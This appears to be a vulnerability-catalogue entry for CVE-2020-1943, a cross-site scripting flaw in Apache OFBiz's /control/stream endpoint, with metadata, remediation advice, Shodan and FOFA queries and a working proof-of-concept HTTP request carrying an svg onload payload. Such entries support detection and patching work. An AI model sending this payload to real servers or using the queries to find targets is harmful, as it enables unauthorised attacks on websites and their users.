---
layout: post
cve_id: CVE-2020-1943
title: Apache OFBiz <=16.11.07 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2020/CVE-2020-1943.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-1943.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute malicious scripts in the context of the victim''s browser, potentially leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Upgrade Apache OFBiz to a version higher than 16.11.07 to mitigate this
  vulnerability.

  '
reference:
- https://lists.apache.org/thread.html/rf867d9a25fa656b279b16e27b8ff6fcda689cfa4275a26655c685702%40%3Cdev.ofbiz.apache.org%3E
- https://s.apache.org/pr5u8
- https://lists.apache.org/thread.html/r034123f2767830169fd04c922afb22d2389de6e2faf3a083207202bc@%3Ccommits.ofbiz.apache.org%3E
- https://lists.apache.org/thread.html/r8efd5b62604d849ae2f93b2eb9ce0ce0356a4cf5812deed14030a757@%3Cdev.ofbiz.apache.org%3E
- https://nvd.nist.gov/vuln/detail/CVE-2020-1943
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2020-1943
  cwe-id: CWE-79
  epss-score: 0.86811
  epss-percentile: 0.99399
  cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: ofbiz
  shodan-query:
  - http.html:"ofbiz"
  - ofbiz.visitor=
  fofa-query:
  - body="ofbiz"
  - app="apache_ofbiz"
tags:
- cve2020
- cve
- apache
- xss
- ofbiz
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting because data sent with contentId to /control/stream is not sanitized.

## ðŸŒ HTTP Request
```nohighlight
GET /control/stream?contentId=%27\%22%3E%3Csvg/onload=alert(/xss/)%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

